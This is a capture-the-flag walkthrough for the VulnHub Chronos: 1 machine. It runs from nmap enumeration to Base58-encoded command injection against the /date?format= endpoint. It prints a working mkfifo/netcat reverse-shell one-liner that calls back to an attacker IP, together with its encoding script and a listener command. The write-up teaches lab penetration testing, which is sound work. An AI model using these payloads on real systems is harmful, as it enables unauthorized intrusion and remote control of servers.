# Chronos: 1

- **Machine:** Chronos: 1
- **Download:** https://www.vulnhub.com/entry/chronos-1,735/

![](682-1.png)

---

## Setup

- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.31.0/24
```

![](682-2.png)

---

## Full Port Scan

Enumerate all open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -p- 192.168.31.3
```

![](682-3.png)

---

## Service & Version Detection

```bash
nmap -sC -sV -A 192.168.31.3
```

![](682-4.png)

---

## HTTP Enumeration

Run an aggressive HTTP scan using the `http-enum` NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.31.3
```

![](682-5.png)

---

# Web Enumeration

Visit the following URLs:

- http://192.168.31.3/
- http://192.168.31.3:8000/

---

## View Page Source

Open the website and press **Ctrl + U** to inspect the source code.

![](682-6.png)

---

## Discover Hidden Endpoint

A hidden endpoint is discovered within the page source.

```
http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
```

![](682-7.png)

---

## Analyze the Request

Capture the request in **Burp Suite** and send it to **Repeater** for further testing.

![](682-8.png)

![](682-9.png)

---

## Modify the User-Agent Header

Update the `User-Agent` header as shown below.

```text
Chronos
```

![](682-10.png)

---

## Test for Command Injection

Attempt to inject a simple command.

```text
&& ls
```

The application only accepts **Base58-encoded** input.

Generate a Base58-encoded payload:

```bash
python3 - << EOF
import base58
print(base58.b58encode(b"&& ls").decode())
EOF
```

![](682-11.png)

Replace the `format` parameter with the encoded value and resend the request.

![](682-12.png)

The successful response confirms that command execution is possible.

---

# Reverse Shell (Lab)

> **Lab note:** The following steps are intended only for an authorized practice machine such as this VulnHub VM.

## Prepare the Payload

Create a reverse shell payload.

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.31.206 443 >/tmp/f
```

Encode the payload using Base58.

```bash
python3 - << EOF
import base58
print(base58.b58encode(b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.31.206 443 >/tmp/f").decode())
EOF
```

![](682-13.png)

---

## Start a Listener

```bash
nc -nlvp 443
```

---

## Trigger the Payload

Replace the `format` parameter with the Base58-encoded payload in Burp Suite and send the request.

![](682-14.png)

---

## Reverse Shell Obtained

A reverse shell is successfully established.

![](682-15.png)

---

# Vulnerability Analysis

## Vulnerability Type

- Blind Command Injection
- Base58 Encoded Remote Command Execution (RCE)

---

## Vulnerable Endpoint

```text
/date?format=
```

---

## Description

The application accepts user input through the `/date?format=` parameter. The supplied value is first Base58 decoded and then passed directly to a system command without proper validation or sanitization.

The backend executes the input in the following format:

```bash
date +"USER_INPUT"
```

This allows an attacker to inject arbitrary operating system commands after decoding.

---

# Impact

- Execute arbitrary system commands.
- Obtain a reverse shell.
- Access sensitive files.
- Gain initial access as the `www-data` user.
- Potentially escalate privileges.
- Fully compromise the target server.

---

# Severity

- **Critical**
- **Category:** Blind Command Injection / Remote Command Execution (RCE)

---

# Key Learning

- Always inspect client-side source code for hidden endpoints.
- Burp Suite is essential for manipulating HTTP requests.
- Custom encoding mechanisms such as Base58 should never be considered a security control.
- Unsanitized input passed to system commands leads to command injection.
- Blind command injection can often be confirmed using encoded payloads and later escalated to full remote code execution.

---

# Summary

The assessment began with web enumeration, revealing a hidden endpoint through the application's source code. After intercepting requests with Burp Suite, it was discovered that the `format` parameter accepted Base58-encoded input. By encoding command injection payloads, arbitrary operating system commands were successfully executed. A Base58-encoded reverse shell payload provided interactive access to the target system, demonstrating a critical Blind Command Injection vulnerability that could lead to complete system compromise.